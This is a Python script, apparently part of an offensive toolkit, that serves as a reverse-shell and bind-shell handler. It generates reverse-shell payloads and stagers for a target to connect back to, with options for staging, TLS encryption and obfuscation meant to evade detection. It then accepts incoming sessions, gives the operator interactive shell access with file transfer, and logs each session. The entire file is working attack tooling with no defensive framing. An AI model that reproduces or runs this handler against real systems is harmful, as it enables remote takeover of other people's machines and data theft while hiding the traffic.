#!/usr/bin/env python3
"""listener — reverse-shell / bind handler with staged, TLS, obfuscated
payloads, interactive getfile/upload, and transcript logging.

usage:  listener.py -P 4444              listen on 0.0.0.0:4444
        listener.py -P 443 -L 10.0.0.5 --staged --tls --obfuscate
        listener.py --render-only -L 10.0.0.5 -P 4444 -k windows
"""
import argparse
import datetime
import os
import sys

sys.path.insert(0, "/home/kali/Projects/Vajra")

try:
    from tools._core import c, ok, err, hr
    from core.listener import (Listener, detect_lhost, pick_lport,
                               run_interactive, render_reverse_payloads,
                               render_stagers)
except ImportError:
    from tools._core import c, ok, err, hr
    from core.listener import (Listener, detect_lhost, pick_lport,
                               run_interactive, render_reverse_payloads,
                               render_stagers)


def main():
    ap = argparse.ArgumentParser(prog="listener")
    ap.add_argument("-L", "--lhost", help="local host for payloads (auto-detect)")
    ap.add_argument("-P", "--lport", type=int, help="port (default: free pick)")
    ap.add_argument("-k", "--kind", default="unix", choices=["unix", "windows"])
    ap.add_argument("--render-only", action="store_true")
    ap.add_argument("--staged", action="store_true",
                    help="serve a two-stage connection (stager -> stage)")
    ap.add_argument("--tls", action="store_true",
                    help="present self-signed TLS on the handler")
    ap.add_argument("--obfuscate", action="store_true",
                    help="pack python stagers with layered encodings")
    args = ap.parse_args()

    lhost = args.lhost or detect_lhost()
    lport = args.lport or pick_lport()
    if args.render_only:
        hr()
        for name, payload in render_reverse_payloads(args.kind, lhost, lport):
            print(c("%s:" % name, bold=True))
            print("    " + payload.replace("\n", "\n    "))
        for name, payload in render_stagers(args.kind, lhost, lport,
                                            tls=args.tls,
                                            obfuscate=args.obfuscate):
            print(c("%s:" % name, bold=True))
            print("    " + payload.replace("\n", "\n    "))
        return 0

    print(c("reverse payloads for %s on :%d" % (lhost, lport), bold=True))
    for name, payload in render_reverse_payloads(args.kind, lhost, lport):
        print("  %-22s %s" % (name, payload.replace("\n", " ")[:60]))
    for name, payload in render_stagers(args.kind, lhost, lport,
                                        tls=args.tls,
                                        obfuscate=args.obfuscate):
        print("  %-22s %s" % (name, payload.replace("\n", " ")[:60]))
    hr()
    flags = []
    if args.staged:
        flags.append("staged")
    if args.tls:
        flags.append("TLS")
    if args.obfuscate:
        flags.append("obfuscated")
    mode = " [%s]" % "+".join(flags) if flags else ""
    print(c("listening on 0.0.0.0:%d%s — Ctrl-C to quit"
            % (lport, mode), color="\033[93m"))

    sess_dir = os.path.join("Outputs", "sessions",
                            datetime.datetime.now().strftime("%Y%m%d_%H%M%S"))
    os.makedirs(sess_dir, exist_ok=True)

    def on_session(sess):
        ok("connection from %s:%d id=%s%s — interactive" %
           (sess.addr[0], sess.addr[1], sess.sid,
            " (TLS)" if sess.tls else ""))
        try:
            with open(os.path.join(sess_dir, "%s.log" % sess.sid),
                      "a", encoding="utf-8") as f:
                f.write("session started %s from %s\n" %
                        (sess.opened_at, ":".join(map(str, sess.addr))))
        except Exception:
            pass
        run_interactive(sess)

    lst = Listener("0.0.0.0", lport, on_session=on_session,
                   use_ssl=args.tls, staged=args.staged)
    lst.daemon = True
    lst.start()
    try:
        lst.join()
    except KeyboardInterrupt:
        pass
    lst.stop()
    return 0


if __name__ == "__main__":
    sys.exit(main())